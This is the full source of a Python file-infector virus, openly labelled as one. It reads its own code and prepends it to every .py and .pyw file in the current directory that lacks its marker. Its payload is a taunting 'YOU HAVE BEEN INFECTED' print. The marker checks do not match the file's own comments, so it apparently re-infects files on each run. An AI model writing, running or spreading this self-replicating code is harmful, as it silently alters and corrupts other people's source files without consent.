#virus says hi 
import sys 
import glob
#imports needed

virus_code = []
#calling variable virus_code to append code to variable

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
#Dynamically Read Lines In Current Directory


self_replicating_part = False
#Boolean To Start A Loop To Determine If File Is INFECTED By reading for Tags
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break


python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
# check whether the file is already infected or not i.e. see if the file already contains the start tag.
# If it does we move on to the next file,
# If it doesn’t we infect it by adding our self-replicating virus code to the existing file code
# so as to preserve the original functionality

#Harmless Malicious print line 
def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

#virus says bye 

